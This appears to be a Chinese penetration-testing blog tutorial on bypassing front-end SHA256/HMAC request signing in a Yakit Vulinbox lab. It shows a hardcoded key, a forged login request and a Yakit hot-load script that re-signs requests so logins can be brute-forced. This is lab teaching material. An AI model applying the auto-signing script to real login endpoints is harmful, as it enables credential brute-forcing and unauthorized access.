[合集 \- 高级前端加解密与验签实战(1\)](https://github.com)1\.渗透测试\-前端验签绕过之SHA25612\-14收起
本文是高级前端加解密与验签实战的第1篇文章，本系列文章实验靶场为Yakit里自带的Vulinbox靶场，本文讲述的是绕过SHA256签名来爆破登录。


## 绕过


[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005130112-183765002.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005130112-183765002.png)


通过查看源代码可以看到key为



```
1234123412341234

```

[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005133198-1662357300.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005133198-1662357300.png)


通过查看源代码可以看到是通过SHA256来进行签名的，他把请求体的username和password字段提取，然后进行加密。



```
username=admin&password=admin123

```

[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005136827-1401035207.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005136827-1401035207.png)


使用Cyberchief加密，最终得到加密值为：`fc4b936199576dd7671db23b71100b739026ca9dcb3ae78660c4ba3445d0654d`


[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005139852-723382500.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005139852-723382500.png)


可以看到自己计算和前端计算的一致：


[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005143563-741888526.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005143563-741888526.png)


修改密码，重新构造签名：



```
username=admin&password=666666
=>
26976ad249c29595c3e9e368d9c3bc772b5a27291515caddd023d69421b7ffee

```

[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005148499-2079865334.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005148499-2079865334.png)


发送请求，可以看到验签成功，密码正确登陆成功，自此签名绕过成功。



```
POST /crypto/sign/hmac/sha256/verify HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{
  "signature": "26976ad249c29595c3e9e368d9c3bc772b5a27291515caddd023d69421b7ffee",
  "key": "31323334313233343132333431323334",
  "username": "admin",
  "password": "666666"
}

```

[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005152327-1303090435.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005152327-1303090435.png)


## 热加载


这是我写的热加载代码，通过`beforeRequest`劫持请求包，使用`encryptData`函数进行加密，最终实现热加载自动签名功能。



```
encryptData = (packet) => {
    body = poc.GetHTTPPacketBody(packet)
    params = json.loads(body)
    //获取账号和密码
    name = params.username
    pass  = params.password
    key = "31323334313233343132333431323334"    //十六进制密钥

    //HmacSha256加密
    signText = f`username=${name}&password=${pass}`
    sign = codec.EncodeToHex(codec.HmacSha256(f`${codec.DecodeHex(key)~}`, signText))

    //构造请求体
    result = f`{"username":"${name}","password":"${pass}","signature":"${sign}","key":"${key}"}`

    return string(poc.ReplaceBody(packet, result, false))
}

//发送到服务端修改数据包
// beforeRequest = func(req){
//     return encryptData(req)
// }

//调试用
packet = <<
```

调试结果如下：
[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005207512-1712536217.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005207512-1712536217.png):[westworld加速](https://xbsj9.com)


把`beforeRequest`取消注释，添加到Web Fuzzer模块的热加载中：


[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005209904-617821989.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005209904-617821989.png)


保存后发送请求，热加载成功实现自动签名功能。
[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005212881-1707760919.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005212881-1707760919.png)
[![](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005215343-226820087.png)](https://img2024.cnblogs.com/blog/2855436/202412/2855436-20241214005215343-226820087.png)


 \_\_EOF\_\_

   ![](https://github.com/CVE-Lemon)柠檬i  - **本文链接：** [https://github.com/CVE\-Lemon/p/18606207](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
